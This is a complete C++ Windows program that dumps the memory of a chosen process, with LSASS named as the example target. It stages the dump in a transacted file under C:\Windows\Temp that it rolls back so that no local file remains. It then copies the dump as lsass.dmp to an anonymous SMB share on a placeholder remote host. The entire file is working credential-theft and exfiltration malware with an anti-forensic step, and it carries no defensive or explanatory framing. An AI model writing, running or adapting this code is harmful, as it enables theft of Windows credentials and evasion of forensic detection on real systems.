#include <windows.h>
#include <ktmw32.h>     // CreateTransaction, RollbackTransaction, etc.
#include <winnetwk.h>   // WNetAddConnection2
#include <iostream>
#include <vector>

#pragma comment(lib, "ktmw32.lib")
#pragma comment(lib, "Mpr.lib")

int wmain() {
    // Declare all variables at the top
    HANDLE hProcess = NULL;
    HANDLE hTransaction = INVALID_HANDLE_VALUE;
    HANDLE hTransactedFile = INVALID_HANDLE_VALUE;
    HANDLE hRemoteFile = INVALID_HANDLE_VALUE;

    wchar_t transactionDesc[] = L"LSASS Dump Transaction";

    DWORD pid = 0;
    const SIZE_T bufferSize = 0x10000; // 64 KB chunks
    BYTE* buffer = nullptr;
    SYSTEM_INFO sysInfo = {};
    LPVOID addr = NULL;
    SIZE_T bytesWrittenTotal = 0;

    LARGE_INTEGER fileSize = {};
    LARGE_INTEGER zero = {};

    std::vector<BYTE> dumpBuffer;
    DWORD bytesRead = 0;
    NETRESOURCE nr = {};
    DWORD rc = 0;
    DWORD bytesWritten = 0;

    std::wcout << L"Enter PID to dump (e.g. lsass): ";
    std::wcin >> pid;

    hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        std::wcerr << L"Failed to open process: " << GetLastError() << std::endl;
        goto cleanup;
    }

    hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, transactionDesc);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        std::wcerr << L"CreateTransaction failed: " << GetLastError() << std::endl;
        goto cleanup;
    }

    hTransactedFile = CreateFileTransactedW(
        L"C:\\Windows\\Temp\\tx.info",
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL);

    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        std::wcerr << L"CreateFileTransacted failed: " << GetLastError() << std::endl;
        goto cleanup;
    }

    buffer = new BYTE[bufferSize];

    GetSystemInfo(&sysInfo);
    addr = sysInfo.lpMinimumApplicationAddress;

    while (addr < sysInfo.lpMaximumApplicationAddress) {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi)) == 0)
            break;

        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_READONLY || mbi.Protect & PAGE_READWRITE ||
                mbi.Protect & PAGE_EXECUTE_READ || mbi.Protect & PAGE_EXECUTE_READWRITE)) {

            SIZE_T regionSize = mbi.RegionSize;
            SIZE_T bytesReadTotal = 0;

            while (bytesReadTotal < regionSize) {
                SIZE_T toRead = min(bufferSize, regionSize - bytesReadTotal);
                SIZE_T bytesReadLocal = 0;
                if (ReadProcessMemory(hProcess,
                    (BYTE*)mbi.BaseAddress + bytesReadTotal,
                    buffer,
                    toRead,
                    &bytesReadLocal) && bytesReadLocal > 0) {

                    DWORD bytesWrittenLocal = 0;
                    if (!WriteFile(hTransactedFile, buffer, (DWORD)bytesReadLocal, &bytesWrittenLocal, NULL)) {
                        std::wcerr << L"WriteFile failed: " << GetLastError() << std::endl;
                        goto cleanup;
                    }

                    bytesWrittenTotal += bytesWrittenLocal;
                    bytesReadTotal += bytesReadLocal;
                }
                else {
                    break; // can't read further
                }
            }
        }

        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
    }

    std::wcout << L"Dumped " << bytesWrittenTotal << L" bytes into transactional file." << std::endl;

    if (!GetFileSizeEx(hTransactedFile, &fileSize)) {
        std::wcerr << L"GetFileSizeEx failed: " << GetLastError() << std::endl;
        goto cleanup;
    }

    zero.QuadPart = 0;
    SetFilePointerEx(hTransactedFile, zero, NULL, FILE_BEGIN);

    dumpBuffer.resize(static_cast<size_t>(fileSize.QuadPart));

    if (!ReadFile(hTransactedFile, dumpBuffer.data(), (DWORD)fileSize.QuadPart, &bytesRead, NULL)) {
        std::wcerr << L"ReadFile failed: " << GetLastError() << std::endl;
        goto cleanup;
    }

    nr.dwType = RESOURCETYPE_DISK;
    nr.lpRemoteName = const_cast<LPWSTR>(L"\\\\IP\\Share");

    // Connect anonymously (no username/password)
    rc = WNetAddConnection2(&nr, NULL, NULL, 0);
    if (rc != NO_ERROR) {
        std::wcerr << L"WNetAddConnection2 failed: " << rc << std::endl;
        goto cleanup;
    }

    hRemoteFile = CreateFileW(
        L"\\\\IP\\Share\\lsass.dmp",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hRemoteFile == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Failed to open remote SMB file: " << GetLastError() << std::endl;
        WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
        goto cleanup;
    }

    if (!WriteFile(hRemoteFile, dumpBuffer.data(), bytesRead, &bytesWritten, NULL)) {
        std::wcerr << L"Failed to write to remote SMB file: " << GetLastError() << std::endl;
        CloseHandle(hRemoteFile);
        WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
        goto cleanup;
    }

    std::wcout << L"Wrote " << bytesWritten << L" bytes to SMB share successfully." << std::endl;

    CloseHandle(hRemoteFile);
    WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);

cleanup:
    if (hTransactedFile != INVALID_HANDLE_VALUE)
        CloseHandle(hTransactedFile);
    if (hTransaction != INVALID_HANDLE_VALUE) {
        if (!RollbackTransaction(hTransaction)) {
            std::wcerr << L"RollbackTransaction failed: " << GetLastError() << std::endl;
        }
        else {
            std::wcout << L"Transaction rolled back — no local file written." << std::endl;
        }
        CloseHandle(hTransaction);
    }
    if (hProcess)
        CloseHandle(hProcess);
    if (buffer)
        delete[] buffer;

    return 0;
}
